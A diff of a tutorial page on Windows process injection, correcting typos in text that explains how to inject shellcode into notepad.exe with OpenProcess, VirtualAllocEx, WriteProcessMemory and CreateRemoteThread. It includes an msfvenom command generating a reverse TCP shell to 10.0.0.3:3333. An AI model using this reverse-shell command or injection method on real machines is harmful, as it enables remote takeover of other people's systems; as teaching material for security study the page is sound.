@@ -6,7 +6,7 @@ description: Shellcode Injection using CreateRemoteThread API
 
 Code Injection is a process to inject code into another running process.
 
-In this article, We are gonna focus on injection shellcode using CreateRemoteThread API.
+In this article, We are gonna focus on injecting shellcode using CreateRemoteThread API.
 
 First off, Let's use Metasploit to generate our malicious shellcode. It's a reverse tcp shell.
 
@@ -22,10 +22,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.3 LPORT=3333 -f c -b \x00
 
 </div>
 
-Now our C++ code to inject and execute this shellcode into a process:
+Now our C++ code to inject and execute this shellcode into a process by following steps:
 
 * First, we need to open our target process, using `OpenProcess` API with the parameter `PROCESS_ALL_ACCESS` which gain all possible access rights for a process object.
-* Then we will use `VirtualAllocEx`  API, which allocates a region of memory within the virtual address space of a target process equal to our size of shellcode. We use the M`EM_RESERVE and MEM_COMMIT` parameters for memory allocation type and `PAGE_EXECUTE_READWRITE` for memory protection of the pages.
+* Then we will use `VirtualAllocEx`  API, which allocates a region of memory within the virtual address space of a target process equal to our size of shellcode. We use the `MEM_RESERVE and MEM_COMMIT` parameters for memory allocation type and `PAGE_EXECUTE_READWRITE` for memory protection of the pages.
 * Write the shellcode data to the allocated memory area in the target process using the `WriteProcessMemory` API.
 * Lastly, create a new thread in the virtual address space of the target process with the `CreateRemoteThread` API to execute the injected shellcode.
 
@@ -130,7 +130,7 @@ int main(int argc, char *argv[])
 
 {% file src="../../.gitbook/assets/ShellCodeInj.exe" %}
 
-Then, we will run our exe with the process ID in which we want to enject our shellcode. For this scenario let's take the `notepad.exe`:
+Then, we will run our `exe` with the `process ID` of our target process in which we want to inject our shellcode. For this scenario we are taking the `notepad.exe`:
 
 <figure><img src="../../.gitbook/assets/Shellcode_Injection.png" alt=""><figcaption></figcaption></figure>
 
@@ -152,4 +152,4 @@ Also on checking the `memory` tab, we can see, the `ws2_32.dll` loaded, and havi
 
 <figure><img src="../../.gitbook/assets/memory.png" alt=""><figcaption></figcaption></figure>
 
-Hene, we successfully injected the shellcode in a process.
+Hene, we successfully injected the shellcode in target process.
